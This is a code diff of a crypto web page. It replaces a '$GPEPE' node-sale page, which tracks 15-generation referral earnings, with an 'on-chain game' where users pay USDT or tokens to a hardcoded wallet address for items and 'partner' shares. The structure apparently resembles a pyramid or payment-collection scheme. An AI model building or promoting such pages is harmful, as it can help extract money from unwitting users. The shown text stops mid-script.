+    .quest-item {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 10px;
+      padding: 15px;
+      border: 1px solid rgba(255, 69, 0, 0.2);
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .quest-icon {
+      font-size: 28px;
+      width: 50px;
+      text-align: center;
+    }
+
+    .quest-info {
+      flex: 1;
+    }
+
+    .quest-name {
+      font-size: 14px;
+      font-weight: bold;
+      color: #ff6b00;
+      margin-bottom: 5px;
+    }
+
+    .quest-desc {
+      font-size: 12px;
+      color: #9ca3af;
+    }
+
+    .quest-reward {
+      font-size: 12px;
+      color: #ffd700;
+      margin-top: 5px;
+    }
+
+    .quest-action {
+      padding: 8px 15px;
+      background: linear-gradient(135deg, #ff6b00, #ff4500);
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .quest-action:hover {
+      box-shadow: 0 0 10px rgba(255, 107, 0, 0.5);
+    }
+
+    .quest-action.disabled {
+      background: rgba(100, 100, 100, 0.5);
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    /* 角色信息 */
+    .character-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 20px;
+    }
+
+    .character-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+
+    .character-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ffd700, #ff6b00);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+    }
+
+    .character-name {
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffd700;
+    }
+
+    .character-level {
+      font-size: 12px;
+      color: #ff8c00;
+    }
+
+    .character-stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+
+    .stat-item {
+      background: rgba(255, 215, 0, 0.05);
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: #9ca3af;
+    }
+
+    .stat-value {
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffd700;
+    }
+
+    /* 装备栏 */
+    .inventory-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(128, 0, 255, 0.2);
+    }
+
+    .inventory-grid {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 10px;
+    }
+
+    .inventory-slot {
+      width: 50px;
+      height: 50px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      transition: all 0.3s;
+    }
+
+    .inventory-slot:hover {
+      border-color: #ffd700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+    }
+
+    .inventory-slot.empty {
+      border-color: rgba(100, 100, 100, 0.3);
+    }
+
+    /* 消息提示 */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.9);
+      padding: 15px 30px;
+      border-radius: 10px;
+      border: 1px solid #ffd700;
+      color: #ffd700;
+      font-size: 14px;
+      z-index: 2000;
+      opacity: 0;
+      transition: opacity 0.3s;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+    }
+
+    .toast.show {
+      opacity: 1;
+    }
+
+    .toast.success {
+      border-color: #22c55e;
+      color: #22c55e;
+      box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
+    }
+
+    .toast.error {
+      border-color: #ef4444;
+      color: #ef4444;
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
+    }
+
+    /* 加载动画 */
+    .loading {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 3000;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(255, 215, 0, 0.3);
+      border-top-color: #ffd700;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* 响应式 */
+    @media (max-width: 600px) {
+      .equipment-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .balance-grid {
+        grid-template-columns: 1fr;
+      }
+      .character-stats {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .inventory-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
+      .game-tabs {
+        flex-wrap: wrap;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <button class="lang-btn" id="langBtn" onclick="toggleLangPanel()">
-      <span class="lang-icon">🌐</span>
-      <span id="langText">中文</span>
-    </button>
-    
-    <div class="lang-panel" id="langPanel">
-      <div class="lang-option" onclick="setLang('zh')">
-        <span>中文</span>
-        <span class="lang-check" id="checkZh">✓</span>
-      </div>
-      <div class="lang-option" onclick="setLang('en')">
-        <span>English</span>
-        <span class="lang-check" id="checkEn"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('ko')">
-        <span>한국어</span>
-        <span class="lang-check" id="checkKo"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('ja')">
-        <span>日本語</span>
-        <span class="lang-check" id="checkJa"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('th')">
-        <span>ภาษาไทย</span>
-        <span class="lang-check" id="checkTh"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('vi')">
-        <span>Tiếng Việt</span>
-        <span class="lang-check" id="checkVi"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('id')">
-        <span>Bahasa Indonesia</span>
-        <span class="lang-check" id="checkId"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('ms')">
-        <span>Bahasa Melayu</span>
-        <span class="lang-check" id="checkMs"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('ru')">
-        <span>Русский</span>
-        <span class="lang-check" id="checkRu"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('pt')">
-        <span>Português</span>
-        <span class="lang-check" id="checkPt"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('es')">
-        <span>Español</span>
-        <span class="lang-check" id="checkEs"></span>
-      </div>
-      <div class="lang-option" onclick="setLang('fr')">
-        <span>Français</span>
-        <span class="lang-check" id="checkFr"></span>
-      </div>
+  <!-- 导航栏 -->
+  <nav class="navbar">
+    <div class="nav-logo">⚔️ 考拉传奇人生</div>
+    <div class="nav-wallet">
+      <button class="sound-btn" id="soundBtn" onclick="SoundManager.toggleMute()" title="关闭音效">🎵</button>
+      <span class="wallet-address" id="walletAddress">未连接</span>
+      <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">连接钱包</button>
     </div>
-    
-    <img src="assets/img1.webp" alt="Golden Pepe" class="hero-img">
-    
-    <div class="header">
-      <h1>$GPEPE</h1>
-      <p class="subtitle" id="subtitle">钻石手 · 黄金共识</p>
-    </div>
-    
-    <div class="tagline" id="tagline">
-      💎 穿越牛熊，打破常规<br>
-      💎 在 BSC 上建立真正的"黄金共識"
-    </div>
-    
-    <div class="wallet-section">
-      <button class="wallet-btn" id="connectBtn" onclick="connectWallet()">💎 连接钱包</button>
-    </div>
-    
-    <div class="stats-grid">
-      <div class="stat-card">
-        <div class="stat-label" id="myNodesLabel">我的节点数量</div>
-        <div class="stat-value" id="myNodes">0</div>
-      </div>
-      <div class="stat-card">
-        <div class="stat-label" id="directTeamLabel">1代直推业绩</div>
-        <div class="stat-value" id="directTeam">0</div>
-      </div>
-      <div class="stat-card">
-        <div class="stat-label" id="totalTeamLabel">15代总业绩</div>
-        <div class="stat-value" id="totalTeam">0</div>
-      </div>
-      <div class="stat-card">
-        <div class="stat-label" id="nodePriceLabel">节点单价</div>
-        <div class="stat-value">1000 <span>USDT</span></div>
-      </div>
-    </div>
-    
-    <div class="referral-section">
-      <div class="referral-card">
-        <h3>🔗 我的推荐链接</h3>
-        <div class="referral-label" id="myReferralLabel">分享给好友，绑定推荐关系</div>
-        <div class="referral-link" id="referralLink">-</div>
-        <button class="copy-btn" id="copyBtn" onclick="copyReferralLink()">📋 复制链接</button>
-      </div>
-      
-      <div class="referral-card">
-        <h3>👤 我的推荐人</h3>
-        <div class="referral-label" id="referrerLabel">我的推荐人地址</div>
-        <div class="referrer-address" id="referrerAddress">-</div>
-      </div>
-    </div>
-    
-    <div class="node-section">
-      <h2>💎 购买黄金节点</h2>
-      <div class="node-price">1000 <span>USDT</span></div>
-      
-      <button class="buy-btn" id="buyGoldBtn" onclick="buyNode('gold')">💎 立即购买黄金节点</button>
-    </div>
-    
-    <div class="node-section" style="border-color: #c0c0c0;">
-      <h2>⚪ 购买白银节点</h2>
-      <div class="node-price" style="color: #c0c0c0;">500 <span>USDT</span></div>
-      
-      <button class="buy-btn" style="background: linear-gradient(135deg, #c0c0c0, #a0a0a0);" id="buySilverBtn" onclick="buyNode('silver')">⚪ 立即购买白银节点</button>
-    </div>
-    
-    <div class="node-section" style="border-color: #22c55e;">
-      <h2>🌱 购买社区节点</h2>
-      <div class="node-price" style="color: #22c55e;">100 <span>USDT</span></div>
-      
-      <button class="buy-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" id="buyCommunityBtn" onclick="buyNode('community')">🌱 立即购买社区节点</button>
-    </div>
-    
-    <div class="node-section" style="border-color: #6366f1;">
-      <h2>🔹 购买轻节点</h2>
-      <div class="node-price" style="color: #6366f1;">10 <span>USDT</span></div>
-      
-      <button class="buy-btn" style="background: linear-gradient(135deg, #6366f1, #4f46e5);" id="buyLightBtn" onclick="buyNode('light')">🔹 立即购买轻节点</button>
-    </div>
-    
-    <div class="section-title">
-      <h2>WHY GPEPE?</h2>
-      <div class="sub" id="whyGpepeSub">为什么是黄金？</div>
-    </div>
-    
-    <div class="why-cards">
-      <div class="why-card green">
-        <div class="circle"></div>
-        <h3 id="greenPepeTitle">绿色 Pepe</h3>
-        <p id="greenPepeDesc">FOMO追高，山顶站岗。涨就冲，跌就慌。</p>
-        <div style="margin-top:15px;">📈📉📈📉🚀</div>
-      </div>
-      
-      <div class="why-card black">
-        <div class="circle"></div>
-        <h3 id="blackPepeTitle">黑化 Pepe</h3>
-        <p id="blackPepeDesc">恐慌砸盘，割肉离场。买完就涨，卖完就跌。</p>
-        <div style="margin-top:15px;">📉🤯📉😭</div>
-      </div>
-      
-      <div class="why-card gold">
-        <div class="circle"></div>
-        <h3 id="goldPepeTitle">黄金 Pepe</h3>
-        <p id="goldPepeDesc">终极觉醒。稳如磐石，钻石手永不松手。</p>
-        <div style="margin-top:15px;">💎🦾📈🏆🚀</div>
-      </div>
-    </div>
-    
-    <div class="section-title">
-      <h2>MECHANISM</h2>
-      <div class="sub" id="mechanismSub1">NO BULLSHIT, JUST CODE.</div>
-      <div class="sub" style="font-size:12px;" id="mechanismSub2">100% 社区驱动，代码即法律。</div>
-    </div>
-    
-    <div class="mechanism-grid">
-      <div class="mechanism-card">
-        <div class="icon">🚫</div>
-        <h4>No Cabal</h4>
-        <div class="chinese-title" id="noCabalTitle">没有幕后黑手</div>
-        <p id="noCabalDesc">规则写死在智能合约里，没有狗庄能动。</p>
-      </div>
-      
-      <div class="mechanism-card">
-        <div class="icon">🐳</div>
-        <h4>Community = Whale</h4>
-        <div class="chinese-title" id="communityWhaleTitle">社区即庄家</div>
-        <p id="communityWhaleDesc">每次买入、持有、传播，都在决定 $GPEPE 的命运。</p>
-      </div>
-      
-      <div class="mechanism-card">
-        <div class="icon">⛓️</div>
-        <h4>On-chain Autopilot</h4>
-        <div class="chinese-title" id="onChainTitle">链上自动驾驶</div>
-        <p id="onChainDesc">流动性、结算、参与，全部链上透明执行。</p>
-      </div>
-      
-      <div class="mechanism-card">
-        <div class="icon">🔐</div>
-        <h4>Contract Open Source</h4>
-        <div class="chinese-title" id="openSourceTitle">合约开源</div>
-        <p id="openSourceDesc">合约代码公开可审计，社区自治，代码为王。</p>
-      </div>
-    </div>
-    
-    <div class="distribution-section">
-      <div class="distribution-ring">
-        <div class="inner">75%<span id="liquidityLabel">流动性注入</span></div>
-      </div>
-      <div class="distribution-boxes">
-        <div class="dist-box">
-          <div class="percent">75%</div>
-          <div class="label" id="liquidityLabel2">流动性注入</div>
+  </nav>
+
+  <!-- 主内容 -->
+  <div class="main-container">
+    <!-- 状态卡片 -->
+    <div class="status-card">
+      <div class="status-header">我的资产</div>
+      <div class="balance-grid">
+        <div class="balance-item">
+          <div class="balance-label">考拉传奇币</div>
+          <div class="balance-value" id="koalaBalance">0</div>
         </div>
-        <div class="dist-box">
-          <div class="percent">25%</div>
-          <div class="label" id="communityLabel">社区</div>
+        <div class="balance-item">
+          <div class="balance-label">USDT余额</div>
+          <div class="balance-value" id="usdtBalance">0</div>
+        </div>
+        <div class="balance-item">
+          <div class="balance-label">BNB余额</div>
+          <div class="balance-value" id="bnbBalance">0</div>
         </div>
       </div>
-      <p style="font-size:12px;color:#666;margin-top:15px;" id="goldRule">黄金法则 · 社区至上</p>
     </div>
-    
-    <div class="section-title">
-      <h2>ROADMAP</h2>
-      <div class="sub" id="roadmapSub1">THE GOLDEN PATH</div>
-      <div class="sub" style="font-size:12px;" id="roadmapSub2">通往黄金王座之路</div>
+
+    <!-- 角色信息 -->
+    <div class="character-section" id="characterSection" style="display:none;">
+      <div class="character-header">
+        <div class="character-avatar">🧙</div>
+        <div>
+          <div class="character-name" id="charName">传奇勇士</div>
+          <div class="character-level">Lv.<span id="charLevel">1</span></div>
+        </div>
+      </div>
+      <div class="character-stats">
+        <div class="stat-item">
+          <div class="stat-label">攻击力</div>
+          <div class="stat-value" id="statAtk">10</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">防御力</div>
+          <div class="stat-value" id="statDef">5</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">生命值</div>
+          <div class="stat-value" id="statHp">100</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">经验值</div>
+          <div class="stat-value" id="statExp">0</div>
+        </div>
+      </div>
     </div>
-    
-    <div class="roadmap-timeline">
-      <div class="roadmap-item green">
-        <div class="roadmap-card">
-          <div class="phase" id="phase1">PHASE 1 - 黄金觉醒</div>
-          <h4>The Awakening</h4>
-          <ul>
-            <li id="phase1Item1">合约部署 · 代码审计</li>
-            <li id="phase1Item2">流动性注入</li>
-            <li id="phase1Item3">启动1,000节点</li>
+
+    <!-- 充值区域 -->
+    <div class="recharge-section">
+      <div class="section-title">💎 充值传奇人生</div>
+      <div class="input-group">
+        <label class="input-label">充值传奇人生币数量</label>
+        <div class="presets">
+          <button class="preset-btn" onclick="setRechargeAmount(10)">10 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(50)">50 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(100)">100 传奇币</button>
+          <button class="preset-btn" onclick="setRechargeAmount(300)">300 传奇币</button>
+        </div>
+        <input type="number" class="input-field" id="rechargeAmount" placeholder="输入传奇人生币数量" step="1">
+      </div>
+      <div class="input-group">
+        <label class="input-label">收款地址</label>
+        <input type="text" class="input-field" id="receiveAddress" 
+               value="0xD5D4587f4bFea0212C6bf63C3358dB417e4d5e04" readonly>
+      </div>
+      <button class="btn btn-primary" id="rechargeBtn" onclick="rechargeKoala()" disabled>
+        充值传奇人生
+      </button>
+    </div>
+
+    <!-- 地推合伙人区域 -->
+    <div class="partner-section">
+      <div class="section-title">🤝 地推合伙人招募</div>
+      <div class="partner-info">
+        <div class="partner-price">100 USDT / 份</div>
+        <div class="partner-desc">成为地推合伙人，共享平台收益</div>
+      </div>
+      <div class="input-group">
+        <label class="input-label">购买份数</label>
+        <div class="presets">
+          <button class="preset-btn active" onclick="setPartnerCount(1)">1份</button>
+        </div>
+        <input type="number" class="input-field" id="partnerCount" value="1" min="1" max="1" readonly>
+      </div>
+      <div class="input-group">
+        <label class="input-label">应付金额: <span id="partnerTotal">100</span> USDT</label>
+      </div>
+      <button class="btn btn-partner" id="partnerBtn" onclick="becomePartner()" disabled>
+        成为合伙人
+      </button>
+    </div>
+
+    <!-- 游戏区域 -->
+    <div class="game-section">
+      <div class="game-title">🎮 传奇人生 · 链上游戏</div>
+      
+      <div class="game-tabs">
+        <div class="game-tab active" onclick="switchTab('synthesize')">装备合成</div>
+        <div class="game-tab" onclick="switchTab('quests')">任务系统</div>
+        <div class="game-tab" onclick="switchTab('boss')">BOSS挑战</div>
+        <div class="game-tab" onclick="switchTab('leaderboard')">战力排行</div>
+      </div>
+
+      <!-- 装备合成 -->
+      <div class="game-panel active" id="synthesizePanel">
+        <div class="equipment-grid" id="equipmentGrid">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- 任务系统 -->
+      <div class="game-panel" id="questsPanel">
+        <div class="quest-list" id="questList">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- BOSS挑战 -->
+      <div class="game-panel" id="bossPanel">
+        <div class="quest-list" id="bossList">
+          <!-- 动态生成 -->
+        </div>
+      </div>
+
+      <!-- 战力排行榜 -->
+      <div class="game-panel" id="leaderboardPanel">
+        <div class="leaderboard-container">
+          <div class="leaderboard-title">🏆 战力排行榜</div>
+          <div class="leaderboard-header">
+            <span>排名</span>
+            <span>玩家</span>
+            <span>职业</span>
+            <span>等级</span>
+            <span>战力</span>
+          </div>
+          <ul class="leaderboard-list" id="leaderboardList">
+            <!-- 动态生成 -->
           </ul>
-        </div>
-      </div>
-      
-      <div class="roadmap-item silver">
-        <div class="roadmap-card">
-          <div class="phase" id="phase2">PHASE 2 - 黄金风暴</div>
-          <h4>The Storm</h4>
-          <ul>
-            <li id="phase2Item1">社区建设启动</li>
-            <li id="phase2Item2">多语言社区拓展</li>
-            <li id="phase2Item3">CMC 收录</li>
-          </ul>
-        </div>
-      </div>
-      
-      <div class="roadmap-item gold">
-        <div class="roadmap-card">
-          <div class="phase" id="phase3">PHASE 3 - 黄金王座</div>
-          <h4>The Throne</h4>
-          <ul>
-            <li id="phase3Item1">公链部署 CEX</li>
-            <li id="phase3Item2">DAO 治理启动</li>
-            <li id="phase3Item3">生态应用发布</li>
-          </ul>
-        </div>
-      </div>
-      
-      <div class="roadmap-item blue">
-        <div class="roadmap-card">
-          <div class="phase" id="phase4">PHASE 4 - 黄金帝国</div>
-          <h4>The Empire</h4>
-          <ul>
-            <li id="phase4Item1">跨链桥上线</li>
-            <li id="phase4Item2">衍生品发行</li>
-            <li id="phase4Item3">机构级托管</li>
-          </ul>
+          <div class="my-rank" id="myRankDisplay"></div>
         </div>
       </div>
     </div>
-    
-    <div class="section-title">
-      <h2>MEME GALLERY</h2>
-    </div>
-    
-    <div class="meme-gallery">
-      <div class="meme-grid">
-        <div class="meme-item">🐸</div>
-        <div class="meme-item">💎</div>
-        <div class="meme-item">🦾</div>
-        <div class="meme-item">🚀</div>
+
+    <!-- 装备栏 -->
+    <div class="inventory-section" id="inventorySection" style="display:none;">
+      <div class="status-header">我的装备栏</div>
+      <div class="inventory-grid" id="inventoryGrid">
+        <!-- 动态生成 -->
       </div>
     </div>
-    
-    <div class="golden-army-section">
-      <div class="golden-army-bg"></div>
-      <div class="golden-army-content">
-        <h2 class="army-title">JOIN THE GOLDEN ARMY</h2>
-        <div class="army-subtitle" id="armySubtitle">加入黄金軍團</div>
-        <p class="army-desc" id="armyDesc">告别 FOMO，拥抱黄金共识。做情绪稳定的暴富者。</p>
-        <button class="telegram-btn" id="telegramBtn">✈️ JOIN TELEGRAM</button>
-      </div>
-      
-      <div class="tags-bar">
-        <span class="tag-item">💎 GOLDEN STANDARD</span>
-        <span class="tag-item">🚀 TO THE MOON</span>
-        <span class="tag-item">🦾 DIAMOND HANDS</span>
-        <span class="tag-item">👑 MEME KING</span>
-        <span class="tag-item">⚔️ GOLDEN ARMY</span>
-        <span class="tag-item">🐸 $GPEPE</span>
-      </div>
-      
-      <div class="golden-pepe-footer">
-        <h3>GOLDEN PEPE</h3>
-        <div class="footer-sub">$GPEPE</div>
-        <p class="footer-desc" id="footerDesc">加入黄金军团，做情绪稳定的暴富者。 💎</p>
-      </div>
-    </div>
-    
-    <img src="assets/img2.jpg" alt="Golden Pepe Team" class="footer-img">
   </div>
+
+  <!-- 消息提示 -->
+  <div class="toast" id="toast"></div>
+
+  <!-- 加载动画 -->
+  <div class="loading" id="loading" style="display:none;">
+    <div class="loading-spinner"></div>
+  </div>
+
+  <!-- Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   
   <script>
-    const CONFIG = {
-      RECEIVE_ADDRESS: '0x51E8eDa782fF21Cc6d526ff59e51667859bCe2E7',
-      USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
-      REFERRAL_CONTRACT: '0x00192Ed57DA751Aee1391FE994D6FcB0F53AE73F',
-      USDT_ABI: [
-        "function approve(address spender, uint256 amount) external returns (bool)",
-        "function allowance(address owner, address spender) external view returns (uint256)",
-        "function balanceOf(address account) external view returns (uint256)",
-        "function transfer(address to, uint256 amount) external returns (bool)",
-        "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
-      ],
-      REFERRAL_ABI: [
-        { "inputs": [{"name": "_usdtAddress", "type": "address"}, {"name": "_receiveAddress", "type": "address"}], "stateMutability": "nonpayable", "type": "constructor" },
-        { "anonymous": false, "inputs": [{"indexed": true, "name": "user", "type": "address"}, {"indexed": true, "name": "referrer", "type": "address"}], "name": "ReferralBound", "type": "event" },
-        { "anonymous": false, "inputs": [{"indexed": true, "name": "user", "type": "address"}, {"indexed": false, "name": "amount", "type": "uint256"}, {"indexed": true, "name": "referrer", "type": "address"}], "name": "NodePurchased", "type": "event" },
-        { "inputs": [{"name": "_referrer", "type": "address"}], "name": "bindReferrer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{"name": "_user", "type": "address"}], "name": "getDirectReferrals", "outputs": [{"name": "", "type": "address[]"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [{"name": "_user", "type": "address"}], "name": "getReferrer", "outputs": [{"name": "", "type": "address"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [{"name": "_user", "type": "address"}], "name": "getUserStats", "outputs": [{"name": "nodeCount", "type": "uint256"}, {"name": "directAmount", "type": "uint256"}, {"name": "totalAmount", "type": "uint256"}, {"name": "referrer", "type": "address"}, {"name": "directCount", "type": "uint256"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [{"name": "_amount", "type": "uint256"}], "name": "purchaseNode", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [], "name": "receiveAddress", "outputs": [{"name": "", "type": "address"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "totalUsers", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "usdtAddress", "outputs": [{"name": "", "type": "address"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "users", "outputs": [{"name": "referrer", "type": "address"}, {"name": "directAmount", "type": "uint256"}, {"name": "totalAmount", "type": "uint256"}, {"name": "nodeCount", "type": "uint256"}], "stateMutability": "view", "type": "function" },
-        { "inputs": [{"name": "_newAddress", "type": "address"}], "name": "setReceiveAddress", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
-      ],
-      NODE_TYPES: {
-        gold: { name: { zh: '黄金节点', en: 'Gold Node' }, price: 1000, color: '#ffd700', bg: 'linear-gradient(135deg, #ffd700, #ffb700)' },
-        silver: { name: { zh: '白银节点', en: 'Silver Node' }, price: 500, color: '#c0c0c0', bg: 'linear-gradient(135deg, #c0c0c0, #a0a0a0)' },
-        community: { name: { zh: '社区节点', en: 'Community Node' }, price: 100, color: '#22c55e', bg: 'linear-gradient(135deg, #22c55e, #16a34a)' },
-        light: { name: { zh: '轻节点', en: 'Light Node' }, price: 10, color: '#6366f1', bg: 'linear-gradient(135deg, #6366f1, #4f46e5)' }
-      }
+    // 配置
+    const KOALA_ADDRESS = '0xf39ff03f155f4a48eddf14abc5ded10f075b5555';
+    const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+    const RECEIVE_ADDRESS = '0xD5D4587f4bFea0212C6bf63C3358dB417e4d5e04';
+    
+    const KOALA_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function decimals() view returns (uint8)",
+      "function symbol() view returns (string)"
+    ];
+
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function decimals() view returns (uint8)"
+    ];
+
+    // 游戏数据（消耗10-300枚考拉传奇币）
+    const equipmentData = [
+      { id: 'sword1', name: '铁剑', icon: '⚔️', cost: 10, atk: 5, level: 1 },
+      { id: 'sword2', name: '铜剑', icon: '🗡️', cost: 30, atk: 10, level: 3 },
+      { id: 'sword3', name: '银剑', icon: '🔪', cost: 80, atk: 20, level: 6 },
+      { id: 'armor1', name: '布甲', icon: '🛡️', cost: 15, def: 5, level: 1 },
+      { id: 'armor2', name: '铁甲', icon: '🥋', cost: 50, def: 15, level: 4 },
+      { id: 'armor3', name: '金甲', icon: '🦺', cost: 120, def: 30, level: 8 },
+      { id: 'helm1', name: '头盔', icon: '⛑️', cost: 20, def: 3, level: 2 },
+      { id: 'ring1', name: '力量戒指', icon: '💍', cost: 40, atk: 8, level: 3 },
+      { id: 'neck1', name: '护身符', icon: '📿', cost: 60, hp: 50, level: 4 }
+    ];
+
+    const questData = [
+      { id: 'q1', name: '新手试炼', icon: '📜', desc: '完成基础训练', cost: 10, reward: '经验+100' },
+      { id: 'q2', name: '采集任务', icon: '🌿', desc: '收集草药材料', cost: 20, reward: '金币+200' },
+      { id: 'q3', name: '猎杀野狼', icon: '🐺', desc: '消灭10只野狼', cost: 50, reward: '铁剑' },
+      { id: 'q4', name: '矿洞探险', icon: '⛏️', desc: '探索神秘矿洞', cost: 80, reward: '稀有矿石' },
+      { id: 'q5', name: '守卫村庄', icon: '🏰', desc: '保护村民安全', cost: 100, reward: '声望+50' }
+    ];
+
+    const bossData = [
+      { id: 'demon', name: '赤月恶魔', icon: '🐉', desc: '传说中的赤月恶魔', cost: 150, reward: '赤月套装' },
+      { id: 'dragon', name: '火焰龙王', icon: '🔥', desc: '火山深处的龙王', cost: 200, reward: '龙王宝剑' },
+      { id: 'lord', name: '黑暗领主', icon: '💀', desc: '黑暗城堡的主人', cost: 300, reward: '传说神装' }
+    ];
+
+    const classData = {
+      warrior: { name: '战士', icon: '⚔️', baseAtk: 15, baseDef: 8, baseHp: 120 },
+      mage: { name: '法师', icon: '🧙', baseAtk: 20, baseDef: 5, baseHp: 80 },
+      archer: { name: '弓箭手', icon: '🏹', baseAtk: 18, baseDef: 6, baseHp: 95 }
     };
-    
-    const I18N = {
-      zh: {
-        subtitle: '钻石手 · 黄金共识',
-        tagline1: '💎 穿越牛熊，打破常规',
-        tagline2: '💎 在 BSC 上建立真正的"黄金共識"',
-        connectWallet: '💎 连接钱包',
-        walletStatus: '未连接',
-        connected: '✅ 已连接',
-        myNodes: '我的节点数量',
-        directTeam: '1代直推业绩',
-        totalTeam: '15代总业绩',
-        nodePrice: '节点单价',
-        buyGold: '💎 立即购买黄金节点',
-        buySilver: '⚪ 立即购买白银节点',
-        buyCommunity: '🌱 立即购买社区节点',
-        buyLight: '🔹 立即购买轻节点',
-        whyGpepe: '为什么是黄金？',
-        greenPepe: '绿色 Pepe',
-        greenDesc: 'FOMO追高，山顶站岗。涨就冲，跌就慌。',
-        blackPepe: '黑化 Pepe',
-        blackDesc: '恐慌砸盘，割肉离场。买完就涨，卖完就跌。',
-        goldPepe: '黄金 Pepe',
-        goldDesc: '终极觉醒。稳如磐石，钻石手永不松手。',
-        mechanismSub: 'NO BULLSHIT, JUST CODE.',
-        mechanismSub2: '100% 社区驱动，代码即法律。',
-        noCabal: '没有幕后黑手',
-        noCabalDesc: '规则写死在智能合约里，没有狗庄能动。',
-        communityWhale: '社区即庄家',
-        communityWhaleDesc: '每次买入、持有、传播，都在决定 $GPEPE 的命运。',
-        onChain: '链上自动驾驶',
-        onChainDesc: '流动性、结算、参与，全部链上透明执行。',
-        openSource: '合约开源',
-        openSourceDesc: '合约代码公开可审计，社区自治，代码为王。',
-        liquidity: '流动性注入',
-        community: '社区',
-        goldRule: '黄金法则 · 社区至上',
-        roadmapSub: 'THE GOLDEN PATH',
-        roadmapSub2: '通往黄金王座之路',
-        phase1: 'PHASE 1 - 黄金觉醒',
-        phase1Title: 'The Awakening',
-        phase1Item1: '合约部署 · 代码审计',
-        phase1Item2: '流动性注入',
-        phase1Item3: '启动1,000节点',
-        phase2: 'PHASE 2 - 黄金风暴',
-        phase2Title: 'The Storm',
-        phase2Item1: '社区建设启动',
-        phase2Item2: '多语言社区拓展',
-        phase2Item3: 'CMC 收录',
-        phase3: 'PHASE 3 - 黄金王座',
-        phase3Title: 'The Throne',
-        phase3Item1: '公链部署 CEX',
-        phase3Item2: 'DAO 治理启动',
-        phase3Item3: '生态应用发布',
-        phase4: 'PHASE 4 - 黄金帝国',
-        phase4Title: 'The Empire',
